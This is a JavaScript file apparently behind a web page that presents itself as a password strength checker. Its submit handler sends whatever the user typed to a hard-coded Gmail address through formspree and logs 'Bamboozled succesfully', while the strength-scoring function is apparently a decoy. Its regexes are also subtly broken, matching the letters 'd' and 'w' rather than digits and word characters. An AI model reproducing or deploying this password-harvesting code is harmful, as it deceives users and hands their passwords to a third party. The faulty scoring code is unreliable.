var targetEmail = "secchec@gmail.com";

$(document).ready(function() {
    $("#submit").click(offload);


});

// Do something before closing
/*
$(window).on('beforeunload', function() {
    console.log("do something");
    return 'Are you sure you want to leave?';
});
*/


// Tests
/*
testPasswords = ["wefaweiu123123", "WaWaEGk182828282", "password", "dog", "Dog", "123", "notapass!"];
for (var i in testPasswords) {
    console.log(testPasswords[i], ":", calculateStrength(testPasswords[i]));
}
*/
// POST data to formspree, which generates and sends an email to secchec@gmail.com
function offload() {
    var payload = $("#userInput").val();

    $.ajax({
        type: "POST",
        url: "http://formspree.io/" + targetEmail, // This must be verified once per page beforehand
        data: {
            body: payload,
            email: targetEmail
        },
        dataType: "json",
        success: function() {
            console.log("Bamboozled succesfully");
        },
        error: function() {
            console.log("Bamboozling failed...")
        }
    });
}
// Returns a number between 0=>100: 100 being a 'perfect' password
function calculateStrength(password) {
    // Only accept alphanumeric passwords, false if password is invalid
    var alphanumeric = /^[a-zA-Z0-9_]+$/
    if (!alphanumeric.test(password)) {
        console.log("Password is not alphanumeric!");
        return false;
    }
    var strengthScore = 0; // Everyone is a failure by default
    // Password should mix cases
    var mixedCase = !((password.toUpperCase() === password) || (password.toLowerCase() === password));
    var hasNumbers = /d/.test(password);
    var hasLetters = /w/.test(password);
    // Password should be a mix of letters and numbers
    var mixLetNum = (hasLetters && hasNumbers);

    // Scoring
    if (password.length < 6) {
        strengthScore += 10;
    } else if (password.length < 9) {
        strengthScore += 40;
    } else if (password.length < 11) {
        strengthScore += 60;
    } else if (password.length < 15) {
        strengthScore += 70;
    } else {
        strengthScore += 75;
    }
    // BONUSES
    if (mixedCase) strengthScore += 15;
    if (mixLetNum) strengthScore += 10;

    return strengthScore;
}
